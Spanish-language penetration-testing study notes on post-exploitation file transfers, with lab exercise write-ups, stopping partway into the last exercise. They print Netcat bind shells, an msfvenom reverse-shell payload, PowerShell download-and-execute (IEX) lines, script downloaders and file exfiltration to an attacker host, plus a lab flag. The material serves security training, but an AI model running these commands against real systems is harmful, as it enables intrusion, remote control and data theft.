---
layout: post
title: File Transfers
subtitle: File Transfers Basics.
tags: [pen]
---
El término *Post-explotation* refiere a las acciones realizadas por el atacante cuando ya ha tomado control de la máquina. Entre estas acciones se encuentran el escalar privilegios, ganar persistencia, efectuar una operación de limpieza de la máquina, etc. 

<br />

### 1. Antecedentes.

#### 1.1. Dangers of Transferring Attack Tools.

En algunos casos, es posible que necesitemos transferir herramientas y utilidades de ataque a nuestro objetivo. Sin embargo, transferir estas herramientas puede ser peligroso por varias razones.

Primero, nuestras herramientas de ataque posteriores a la explotación pueden ser abusadas por partes malintencionadas, lo que pone en riesgo los recursos del cliente. Es extremadamente importante documentar las cargas y eliminarlas una vez finalizada la evaluación.

En segundo lugar, el software antivirus, que analiza los sistemas de archivos de los terminales en busca de firmas de archivos predefinidas, se convierte en una gran frustración para nosotros durante esta fase. Este software, que es omnipresente en la mayoría de los entornos corporativos, detectará nuestras herramientas de ataque, las pondrá en cuarentena (haciéndolas inútiles) y alertará a un administrador del sistema.

Si el administrador del sistema es diligente, esto nos costará un valioso shell remoto interno o, en casos extremos, señalará el final efectivo de nuestro compromiso. Si bien la evasión antivirus está más allá del alcance de este módulo, analizamos este tema en detalle en otro módulo.

Como regla general, *siempre debemos intentar usar herramientas nativas en el sistema comprometido. Alternativamente, podemos cargar herramientas adicionales cuando las nativas son insuficientes, cuando hemos determinado que el riesgo de detección se minimiza o cuando nuestra necesidad supera el riesgo de detección*.

<br />

#### 1.2. Installing Pure-FTPd.

Para acomodar los ejercicios de este módulo, instalemos rápidamente el servidor Pure-FTPd en nuestra máquina de ataque Kali. Si ya tiene un servidor FTP configurado en su sistema Kali, puede omitir estos pasos.

```
kali@kali:~$ sudo apt update && sudo apt install pure-ftpd
```

Antes de que cualquier cliente pueda conectarse a nuestro servidor FTP, debemos crear un nuevo usuario para Pure-FTPd. El siguiente script de Bash automatizará la creación de usuarios para nosotros:

```
kali@kali:~$ cat ./setup-ftp.sh
#!/bin/bash

sudo groupadd ftpgroup
sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
sudo pure-pw useradd offsec -u ftpuser -d /ftphome
sudo pure-pw mkdb
cd /etc/pure-ftpd/auth/
sudo ln -s ../conf/PureDB 60pdb
sudo mkdir -p /ftphome
sudo chown -R ftpuser:ftpgroup /ftphome/
sudo systemctl restart pure-ftpd
```

Haremos que el script sea ejecutable, luego lo ejecutaremos e ingresaremos "lab" como la contraseña para el usuario de offsec cuando se le solicite:

```
kali@kali:~$ chmod +x setup-ftp.sh
kali@kali:~$ sudo ./setup-ftp.sh
Password:
Enter it again:
Restarting ftp server
```

<br />

#### 1.3. Non-interactive shell. 

La mayoría de las herramientas similares a Netcat proporcionan un shell no interactivo, lo que significa que los programas que requieren input del usuario, como muchos programas de transferencia de archivos o su y sudo , tienden a funcionar mal, si es que funcionan. Los shells no interactivos también carecen de funciones útiles como el tab completion o job control.

Es de esperar que esté familiarizado con el comando ls. Este comando no es interactivo porque puede completarse sin la interacción del usuario.

Por el contrario, considere una sesión típica de inicio de sesión FTP desde nuestro cliente de laboratorio Debian a nuestro sistema Kali:

```
student@debian:~$ ftp 10.11.0.4
Connected to 10.11.0.4.
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 1 of 50 allowed.
220-Local time is now 09:07. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
Name (10.11.0.4:student): offsec
331 User offsec OK. Password required
Password:
230 OK. Current directory is /
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> bye
221-Goodbye. You uploaded 0 and downloaded 0 kbytes.
221 Logout.
student@debian:~$
```

En esta sesión, ingresamos un nombre de usuario y contraseña, y el proceso se sale solo después de que ingresamos el comando bye. Este es un programa interactivo; requiere la intervención del usuario para completarse.

Aunque el problema puede ser obvio en este punto, intentemos una sesión FTP a través de un shell no interactivo, en este caso, Netcat.

Para comenzar, supongamos que hemos comprometido un cliente Debian y hemos obtenido acceso a un shell de enlace de Netcat. Lanzaremos Netcat en nuestro cliente Debian escuchando en el puerto 4444 para simular esto:

```
student@debian:~$ nc -lvnp 4444 -e /bin/bash
listening on [any] 4444 ...
```

Desde nuestro sistema Kali, nos conectaremos al shell de escucha e intentaremos la sesión FTP del Listado 4 nuevamente:

```
kali@kali:~$ nc -vn 10.11.0.128 4444
ftp 10.11.0.4
offsec
lab
bye

^C
kali@kali:~$
```

Detrás de escena, estamos interactuando con el servidor FTP, pero no recibimos ningún comentario en nuestro shell. Esto se debe a que STDOUT de la sesión FTP (un programa interactivo) no se redirige correctamente en un bind/reverse shell. Esto da como resultado la pérdida de control de nuestro shell y nos vemos obligados a salir por completo con Ctrl + C. Esto podría resultar muy problemático durante una evaluación.

<br />

**Upgrading a Non-Interactive Shell**

Ahora que entendemos algunas de las limitaciones de los shells no interactivos, examinemos cómo podemos "actualizar" nuestro shell para que sea mucho más útil. El intérprete de Python, frecuentemente instalado en sistemas Linux, viene con un módulo estándar llamado *pty* que permite la creación de pseudoterminales. Al usar este módulo, podemos generar un proceso separado desde nuestro shell remoto y obtener un shell completamente interactivo. Probemos esto.

Nos volveremos a conectar a nuestro shell Netcat de escucha y generaremos nuestro shell *pty*:

```
kali@kali:~$ nc -vn 10.11.0.128 4444
(UNKNOWN) [10.11.0.128] 4444 (?) open
python -c 'import pty; pty.spawn("/bin/bash")'
student@debian:~$
```

Inmediatamente después de ejecutar nuestro comando de Python, nos recibe un indicador familiar de Bash. Intentemos conectarnos a nuestro servidor FTP local nuevamente, esta vez a través del shell *pty* y veamos cómo se comporta:

```
student@debian:~$ ftp 10.11.0.4
ftp 10.11.0.4
Connected to 10.11.0.4.
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 1 of 50 allowed.
220-Local time is now 09:16. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
Name (10.11.0.4:student): offsec
offsec
331 User offsec OK. Password required
Password:offsec

230 OK. Current directory is /
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> bye
bye
221-Goodbye. You uploaded 0 and downloaded 0 kbytes.
221 Logout.
student@debian:~$
```

Esta vez, nuestra conexión interactiva con el servidor FTP fue exitosa y cuando salimos, regresamos a nuestro indicador de Bash actualizado. Esta técnica proporciona efectivamente un shell interactivo a través de un canal tradicionalmente no interactivo y es una de las actualizaciones más populares de un shell no interactivo estándar en Linux.

<br />

### 2. Transfering Files with Windows Hosts.

En entornos tipo Unix, a menudo encontraremos herramientas como Netcat, curl o wget preinstaladas con el sistema operativo, que hacen que la descarga de archivos desde una máquina remota sea relativamente sencilla. Sin embargo, en las máquinas con Windows, el proceso no suele ser tan sencillo. En esta sección, exploraremos las opciones de transferencia de archivos en máquinas basadas en Windows.

<br />

#### 2.1. Non-interactive FTP Download. 

Los hosts de Windows contienen por defecto un cliente ftp que puede ser empleado para transferir archivos. El cliente FTP es un programa interactivo (requiere de input por parte del usuario). Esto representa un incoveniente ya que al tener en primera instancia una shell no interactiva no podemos aprovecharnos de las ventajas que el servicio FTP puede proporcionarnos.

Sin embargo, inspeccionando la ayuda del cliente FTP con *ftp -h*:

```
C:\Users\offsec> ftp -h

Transfers files to and from a computer running an FTP server service
(sometimes called a daemon). Ftp can be used interactively.

FTP [-v] [-d] [-i] [-n] [-g] [-s:filename] [-a] [-A] [-x:sendbuffer] [-r:recvbuffer] [-b:asyncbuffers] [-w:windowsize] [host]

  -v              Suppresses display of remote server responses.
  -n              Suppresses auto-login upon initial connection.
  -i              Turns off interactive prompting during multiple file
                  transfers.
  -d              Enables debugging.
  -g              Disables filename globbing (see GLOB command).
  -s:filename     Specifies a text file containing FTP commands; the
                  commands will automatically run after FTP starts.
  -a              Use any local interface when binding data connection.
  -A              login as anonymous.
  -x:send sockbuf Overrides the default SO_SNDBUF size of 8192.
  -r:recv sockbuf Overrides the default SO_RCVBUF size of 8192.
  -b:async count  Overrides the default async count of 3
  -w:windowsize   Overrides the default transfer buffer size of 65535.
  host            Specifies the host name or IP address of the remote
                  host to connect to.

Notes:
  - mget and mput commands take y/n/q for yes/no/quit.
  - Use Control-C to abort commands.
```

Vemos que especialmente intersante es la opción '-s' que acepta comandos escritos sobre un fichero. Esto nos podría servir para utilizar el cliente ftp sin necesidad de proporcionar input al servicio ya que podríamos escribir en un fichero comandos FTP y el servicio con la opción '-s' los procesaría automáticamente.

De esta forma, podemos proceder de la siguiente manera: 

- Primero, en nuestra máquina atacante generamos un servidor FTP.
- Colocamos en el fichero raíz del servicio una copia del binario 'nc-exe':

```
kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/
kali@kali:~$ ls /ftphome/
nc.exe
```

- Reiniciamos el servicio FTP para asegurarnos que funciona correctamente:

```
sudo systemctl restart pure-ftpd
```

- A continuación construimos un fichero de texto con comandos FTP para ser ejecutados.

```
C:\Users\offsec>echo open 10.11.0.4 21> ftp.txt
C:\Users\offsec>echo USER offsec>> ftp.txt
C:\Users\offsec>echo lab>> ftp.txt
C:\Users\offsec>echo bin >> ftp.txt
C:\Users\offsec>echo GET nc.exe >> ftp.txt
C:\Users\offsec>echo bye >> ftp.txt
```

Estos comandos se logean en nuestro servidor FTP local como el usuario Offsec y descargan el binario 'nc.exe'.

- Por último, iniciamos el proceso a través del siguiente comando ftp en la máquina víctima:

```
C:\Users\offsec> ftp -v -n -s:ftp.txt
```

Así conseguimos que se ejecuten nuestros comandos y obtenemos el binario de netcat sin necesidad de tener una shell interactiva.

<br />

#### 2.2. Windows Downloads Using Scripting Languages.

Podemos aprovecharnos de ciertos motores de scripting para descargar ficheros en un host de Windows como por ejemplo VBScript o PowerShell. Así por ejemplo podemos construir con el comando no interactivo *echo* un HTTP Downloader de VBScript:

```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo  Err.Clear >> wget.vbs
echo  Set http = Nothing >> wget.vbs
echo  Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo  http.Open "GET", strURL, False >> wget.vbs
echo  http.Send >> wget.vbs
echo  varByteArray = http.ResponseBody >> wget.vbs
echo  Set http = Nothing >> wget.vbs
echo  Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo  Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo  strData = "" >> wget.vbs
echo  strBuffer = "" >> wget.vbs
echo  For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo  ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo  Next >> wget.vbs
echo  ts.Close >> wget.vbs
```

Y continuación podemos ejecutarlo con *cscript*:

```
C:\Users\Offsec> cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
```

Sin embargo, para versiones de Windows más modernas (Windows 7 en adelante) podemos emplear PowerShell. De nuevo, el esquema es el mismo, con un comando no interactivo formamos un Downloader a partir de la clase de PowerShell *System.Net.WebClient*:

```
C:\Users\Offsec> echo $webclient = New-Object System.Net.WebClient >>wget.ps1
C:\Users\Offsec> echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1
C:\Users\Offsec> echo $file = "new-exploit.exe" >>wget.ps1
C:\Users\Offsec> echo $webclient.DownloadFile($url,$file) >>wget.ps1
```

Y acto seguido podemos emplear PowerShell para ejecutar el script y descargar el fichero:

```
C:\Users\Offsec> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

Primero, debemos permitir la ejecución de scripts de PowerShell (que está restringido de forma predeterminada) con la palabra clave -ExecutionPolicy y el valor Bypass . A continuación, usaremos -NoLogo y -NonInteractive para ocultar el banner del logotipo de PowerShell y suprimir el aviso interactivo de PowerShell, respectivamente. La palabra clave -NoProfile evitará que PowerShell cargue el perfil predeterminado (que no es necesario), y finalmente especificamos el archivo de script con -File :

Podemos ahorrarnos esta parte de los scripts ejecutándo el comando anterior a modo de una sola línea:

```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
```

Podemos incluso ejecutar un script de localización remota en nuestra máquina (o lo que sería lo mismo descargar y ejecutar sin guardar el script) con el siguiente comando:

Supongámos que tenemos un fichero en nuestra máquina local como sigue:

```
kali@kali:/var/www/html$ sudo cat helloworld.ps1 
Write-Output "Hello World"
```

Observemos que está en el directorio raíz del servidor web, así, lo descargamos mediante una request HTTP con:

```
C:\Users\Offsec> powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
Hello World
```

Podemos ver que lo que obtenemos no es el script sino su output.

<br />

#### 2.3. Windows Downloads with exe2hex and PowerShell.

En esta sección tomaremos una ruta algo tortuosa, aunque muy interesante, para descargar un archivo binario de Kali a un host de Windows comprometido. 

Comenzando en nuestra máquina Kali, comprimiremos el binario que queremos transferir, lo convertiremos en una cadena hexadecimal y lo incrustaremos en un script de Windows.

En la máquina con Windows, pegaremos este script en nuestro shell y lo ejecutaremos. Redirigirá los datos hexadecimales a powershell.exe, que los ensamblará nuevamente en un binario. Esto se hará a través de una serie de comandos no interactivos.

Como ejemplo, usemos powershell.exe para transferir Netcat desde nuestra máquina Kali Linux a nuestro cliente de Windows a través de un shell remoto.

Comenzaremos localizando e inspeccionando el archivo nc.exe en Kali Linux.

```
kali@kali:~$ locate nc.exe | grep binaries
/usr/share/windows-resources/binaries/nc.exe

kali@kali:~$ cp /usr/share/windows-resources/binaries/nc.exe .

kali@kali:~$ ls -lh nc.exe
-rwxr-xr-x 1 kali kali 58K Sep 18 14:22 nc.exe
```

Aunque el binario ya es bastante pequeño, reduciremos el tamaño del archivo para mostrar cómo se hace. Usaremos upx , un empaquetador ejecutable (también conocido como herramienta de compresión PE):

```
kali@kali:~$ upx -9 nc.exe
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2018
UPX 3.95        Markus Oberhumer, Laszlo Molnar & John Reiser   Aug 26th 2018

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     59392 ->     29696   50.00%    win32/pe     nc.exe
Packed 1 file.

kali@kali:~$ ls -lh nc.exe
-rwxr-xr-x 1 kali kali 29K Sep 18 14:22 nc.exe
```

*Como podemos ver, upx ha optimizado el tamaño del archivo de nc.exe , reduciéndolo en casi un 50%. A pesar del tamaño más pequeño, el archivo de Windows PE sigue siendo funcional y se puede ejecutar con normalidad.*

Ahora que nuestro archivo está optimizado y listo para la transferencia, podemos convertir nc.exe en un script de Windows ( .cmd ) para ejecutarlo en la máquina con Windows, que convertirá el archivo en hexadecimal e indicará a powershell.exe que lo vuelva a ensamblar en binario. Usaremos la excelente herramienta *exe2hex* para el proceso de conversión:

```
kali@kali:~$ exe2hex -x nc.exe -p nc.cmd
[*] exe2hex v1.5.1
[+] Successfully wrote (PoSh) nc.cmd
```

Esto crea un script llamado nc.cmd con contenido como el siguiente:

```
kali@kali:~$ head nc.cmd
echo|set /p="">nc.hex
echo|set /p="4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000">>nc.hex
echo|set /p="504500004c010300b98eae340000000000000000e0000f010b010500007000000010000000d00000704c010000e000000050010000004000001000000002000004000000000000000400000000000000006001000010000000000000030000000000100000100000000010000010000000000000100000000000000000000000">>nc.hex
...
```

Observe cómo la mayoría de los comandos en esta secuencia de comandos no son interactivos, y en su mayoría consisten en comandos de eco. Hacia el final del script, encontramos comandos que reconstruyen el ejecutable nc.exe en la máquina de destino:

```
...
powershell -Command "$h=Get-Content -readcount 0 -path './nc.hex';$l=$h[0].length;$b=New-Object byte[] ($l/2);$x=0;for ($i=0;$i -le $l-1;$i+=2){$b[$x]=[byte]::Parse($h[0].Substring($i,2),[System.Globalization.NumberStyles]::HexNumber);$x+=1};set-content -encoding byte 'nc.exe' -value $b;Remove-Item -force nc.hex;"
```

Cuando copiamos y pegamos este script en un shell en nuestra máquina con Windows y lo ejecutamos, podemos ver que, de hecho, crea una copia que funciona perfectamente de nuestro nc.exe original .

```
...
000000000000000000000000000000000000000000000">>nc.hex

C:\Users\offsec>powershell -Command "$h=Get-Content -readcount 0 -path './nc.hex';$l=$h[0].length;$b=New-Object byte[] ($l/2);$x=0;for ($i=0;$i -le $l-1;$i+=2){$b[$x]=[byte]::Parse($h[0].Substring($i,2),[System.Globalization.NumberStyles]::HexNumber);$x+=1};set-content -encoding byte 'nc.exe' -value $b;Remove-Item -force nc.hex;"

C:\Users\offsec> nc -h
[v1.10 NT]
connect to somewhere:   nc [-options] hostname port[s] [ports] ...
listen for inbound:     nc -l -p port [options] [hostname] [port]
options:
        -d              detach from console, stealth mode

        -e prog         inbound program to exec [dangerous!!]
...
```

<br />

#### 2.4. Windows Uploads Using Windows Scripting Languages.

En ciertos escenarios, es posible que necesitemos filtrar datos de una red de destino utilizando un cliente de Windows. Esto puede ser complejo ya que los servidores TFTP, FTP y HTTP estándar rara vez están habilitados en Windows de manera predeterminada.

Afortunadamente, si se permite el tráfico HTTP saliente, podemos usar la clase _System.Net.WebClient_ PowerShell para cargar datos en nuestra máquina Kali a través de una solicitud HTTP POST.

Para hacer esto, podemos crear el siguiente script PHP y guardarlo como upload.php en nuestro directorio webroot de Kali, /var/www/html :

```
<?php
$uploaddir = '/var/www/uploads/';

$uploadfile = $uploaddir . $_FILES['file']['name'];

move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```


El código PHP del Listado 28 procesará una solicitud de carga de archivo entrante y guardará los datos transferidos en el directorio /var/www/uploads/ .

A continuación, debemos crear la carpeta de subidas y modificar sus permisos, otorgando al usuario _www-data_ la propiedad y los permisos de escritura posteriores:

```
kali@kali:/var/www$ sudo mkdir /var/www/uploads

kali@kali:/var/www$ ps -ef | grep apache
root      1946     1  0 21:39 ?        00:00:00 /usr/sbin/apache2 -k start
www-data  1947  1946  0 21:39 ?        00:00:00 /usr/sbin/apache2 -k start

kali@kali:/var/www$ sudo chown www-data: /var/www/uploads

kali@kali:/var/www$ ls -la
total 16
drwxr-xr-x  4 root     root     4096 Feb  2 00:33 .
drwxr-xr-x 13 root     root     4096 Sep 20 14:57 ..
drwxr-xr-x  2 root     root     4096 Feb  2 00:33 html
drwxr-xr-x  2 www-data www-data 4096 Feb  2 00:33 uploads
```

Tenga en cuenta que esto permitiría que cualquier persona que interactúe con uploads.php cargue archivos en nuestra máquina virtual Kali.

Con Apache y el script PHP listos para recibir nuestro archivo, nos trasladamos al host de Windows comprometido e invocamos el método UploadFile de la clase System.Net.WebClient para cargar el documento que queremos exfiltrar, en este caso, un archivo llamado importante. docx :

```
C:\Users\Offsec> powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
```

Después de la ejecución del comando powershell , podemos verificar la transferencia exitosa del archivo:

```
kali@kali:/var/www/uploads$ ls -la
total 360
drwxr-xr-x 2 www-data www-data   4096 Feb  2 00:38 .
drwxr-xr-x 4 root     root       4096 Feb  2 00:33 ..
-rw-r--r-- 1 www-data www-data 359250 Feb  2 00:38 important.docx
```

<br />

#### 2.5. Uploading files with TFTP.

Si bien los métodos de transferencia de archivos basados ​​en Windows que se muestran arriba funcionan en todas las versiones de Windows desde Windows 7 y Windows Server 2008 R2, es posible que tengamos problemas al encontrar sistemas operativos más antiguos. PowerShell, aunque es muy potente y se usa con frecuencia, no está instalado de forma predeterminada en sistemas operativos como Windows XP y Windows Server 2003, que todavía se encuentran en algunas redes de producción. Si bien tanto VBScript como el cliente FTP están presentes y funcionarán, en esta sección analizaremos otro método de transferencia de archivos que puede ser efectivo en el campo.

TFTP es un protocolo de transferencia de archivos basado en UDP y, a menudo, está restringido por las reglas del firewall de salida corporativo.

Durante una prueba de penetración, podemos usar TFTP para transferir archivos desde sistemas operativos Windows más antiguos hasta Windows XP y 2003. Esta es una excelente herramienta para la transferencia de archivos no interactiva, pero no está instalada de forma predeterminada en los sistemas que ejecutan Windows 7, Windows 2008 y posteriores.

Por estas razones, TFTP no es un protocolo de transferencia de archivos ideal para la mayoría de las situaciones, pero en las circunstancias adecuadas, tiene sus ventajas.

Antes de aprender a transferir archivos con TFTP, primero debemos instalar y configurar un servidor TFTP en Kali y crear un directorio para almacenar y servir archivos. A continuación, actualizamos la propiedad del directorio para que podamos escribir archivos en él. Ejecutaremos atftpd como un demonio en el puerto UDP 69 y lo dirigiremos para usar el directorio /tftp recién creado:

```
kali@kali:~$ sudo apt update && sudo apt install atftp
kali@kali:~$ sudo mkdir /tftp
kali@kali:~$ sudo chown nobody: /tftp
kali@kali:~$ sudo atftpd --daemon --port 69 /tftp
```

En el sistema Windows, ejecutaremos el cliente tftp con -i para especificar una transferencia de imagen binaria, la dirección IP de nuestro sistema Kali, el comando put para iniciar una carga y, finalmente, el nombre del archivo que se cargará.

El comando final es similar al que se muestra a continuación en el Listado 33:

```
C:\Users\Offsec> tftp -i 10.11.0.4 put important.docx
Transfer successful: 359250 bytes in 96 second(s), 3712 bytes/s
```

<br />


### 3. Exercises.

Antes de proceder a realizar los ejercicios anteriores, abrimos una shell no interactiva entre Windows y Kali:

En primer lugar nos aseguramos tener un shell no-interactivo a través de netcat. Esto lo conseguimos generamos una reverse-shell payload con msfvenom:

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.127.132 LPORT=4444 -f exe -o reverse.exe
```

Seguidamente activamos un listener de netcat en el puerto 4444 y transferimos el reverse.exe al cliente de windowsa través de una descarga de un servidor de python:

```
python3 -m http.server  
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Y lo descargamos desde Windows con powershell:

```
powershell "Invoke-WebRequest -Uri http://192.168.127.132:8000/reverse.exe -OutFile Desktop\reverse.exe"
```

Ahora ejecutamos el binario y capturaremos al conexión con un listener netcat activado previamente. De esta forma se nos abrirá una shell a través de Netcat que como sabemos, es no interactiva.

<br />

**1. Use VBScript para transferir archivos en un shell no interactivo de Kali a Windows.**

Utilizamos la siguiente secuencia de comandos con el comando no intercativo echo para formar un HTTP Downloader basado en VBScript que podemos utilizar ocn la utilidad *cscript*:

```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo  Err.Clear >> wget.vbs
echo  Set http = Nothing >> wget.vbs
echo  Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo  http.Open "GET", strURL, False >> wget.vbs
echo  http.Send >> wget.vbs
echo  varByteArray = http.ResponseBody >> wget.vbs
echo  Set http = Nothing >> wget.vbs
echo  Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo  Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo  strData = "" >> wget.vbs
echo  strBuffer = "" >> wget.vbs
echo  For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo  ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo  Next >> wget.vbs
echo  ts.Close >> wget.vbs
```

Estos comandos se pueden copy-paste en bloque. 

Y lo empleamos como hemos descrito anteriormente:

```
C:\Users\aeoae\Desktop>cscript wget.vbs http://192.168.127.132:8000/flag.txt              
echo  ts.Close >> wget.vbscscript wget.vbs http://192.168.127.132:8000/flag.txt

C:\Users\aeoae\Desktop>type flag.txt
type flag.txt
Congrats you have the flag!
```

<br />

**2.  Use PowerShell para transferir archivos en un shell no interactivo de Kali a Windows y viceversa.**

Podemos crear un HTTP Downloader a través de la siguiente secuencia de comandos del comando no interactivo 'echo':

```
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://192.168.127.132:8000/flag.txt" >>wget.ps1
echo $file = "flag.txt" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```

Y seguidamente ejecutamos el script:

```
C:\Users\aeoae\Desktop>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

C:\Users\aeoae\Desktop>type flag.txt
type flag.txt
Congrats you have the flag
```

También podemos utilizar un comando:

```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.127.132:8000/flag.txt', 'flag.txt')
```

Y recordar que si estamos descargando un script de powershell (.ps1) podemos ejecutar un script remotamante en la máquina local (esto es descargar y ejecutar sin guardar el archivo) añadiendo la opción IEX:

```
C:\Users\Offsec> powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/flag.ps1')
Congrats you have the flag
```

<br />

**3.  Para PowerShell versión 3 y superior, que está presente de forma predeterminada en Windows 8.1 y Windows 10, se agregó el cmdlet \[Invoke-WebRequest .](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-6) Intente utilizarlo para realizar solicitudes de carga y descarga en su máquina Kali.**

Podemos también utilizar el módulo "Invoke-WebRequest" para desargar archivos de un servidor HTTP:

```
powershell "Invoke-WebRequest -Uri http://192.168.127.132:8000/flag.txt -OutFile flag.txt"

C:\Users\aeoae\Desktop>powershell "Invoke-WebRequest -Uri http://192.168.127.132:8000/flag.txt -OutFile flag.txt"; type flag.txt
powershell "Invoke-WebRequest -Uri http://192.168.127.132:8000/flag.txt -OutFile flag.txt"; type flag.txt
Congrats you have the flag
```

<br />

**5. Al igual que los humanos, nuestro programa operativo de disco y forma de vida genética *GLaDOP* se nutre de la interacción social. Puede encontrar este programa en la VM n.º 1 de destino en el puerto 5000. Una vez obtenido un shell interactivo completo, desde la carpeta /challenge , inicie el programa GLaDOP para resolver este desafío y obtener la bandera. NOTA: un binario python3 está disponible en la máquina de destino.**

Lo que se nos está pidiendo es que nos conectemos a un servicio que simula una reverse shell y consigamos estabilizar la shell que se nos ofrece en dicho servicio:

```
> nc -nv 192.168.217.52 5000
(UNKNOWN) [192.168.217.52] 5000 (?) open
whoami
student
```

Vemos que tenemos python3 instalado:

```
python3 --version
Python 3.8.10
```

De esta forma, podemos spawnear con el modulo de python 'pty' una shell y luego llevar a cabo una importancion de terminos especiales para estabilizar la shell:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
student@d817267aabbe:/challenge$ export term=xterm
export term=xterm
student@d817267aabbe:/challenge$
```

Ahora dejamos nuestro proceso suspendido (que no terminado) con Ctrl + Z y escribimos:

```
> stty raw -echo; fg
[1]  + continued  nc -nv 192.168.217.52 5000
                                            ls
GLaDOP  start.sh
student@d817267aabbe:/challenge$ 
```

Nuestra shell está ahora totalmente estabilizada.

Comencemos a realizar el reto:

```
student@d817267aabbe:/challenge$ ./GLaDOP 
Hello and welcome to the Offensive Security computer-aided enrichment testing center.
This center thrives on interaction; unfortunately, this test chamber is currently broken.
Make no attempt to solve this challenge and press 'Q' to quit.
q

Hello once again. To reiterate, the Enrichment Center offers its most sincere
apologies on the occasion of this broken and unsolvable test environment.
Please press anything but 'C' to stop wasting your time on this challenge.
C

I see you are still going. Unbelievable!
You, Subject Name Here, must be the pride of Subject Hometown Here.
But, quite frankly, this chamber was a mistake. If we were you, we would quit now.
Quit now and cake will be served immediately. Press 'q' to get some cake.

a

Hmm. You are still here. No one will blame you for giving up.
In fact, quitting at this point is a perfectly reasonable response.
You really should just give up. Do not press 'g' if you want to give up.
g

Fantastic! You remained resolute and resourceful in an atmosphere of extreme pessimism.
We are so ... happy.
Here is your flag:
OS{8c2cbc9602149dd7ea96a5f7a58bc06e}
Press any key to continue...
```

<br />

**6. En la VM de destino #2, encontró lo que cree que es un binario de Linux en la carpeta /challenge mientras estaba en un servidor donde tiene acceso a PowerShell a través de ssh. Use este acceso para extraer este programa a su máquina virtual Kali Linux local y luego ejecútelo para obtener el indicador.**

Abrimos la shell y efectivamente observamos que tenemos acceso a una shell de powershell

```
> ssh student@192.168.231.52 -p 2222
The authenticity of host '[192.168.231.52]:2222 ([192.168.231.52]:2222)' can't be established.
ED25519 key fingerprint is SHA256:qNi9O+uN0HjdEXGV7yMDyV/ipBSP9+Bv1+5QajB4Pa4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
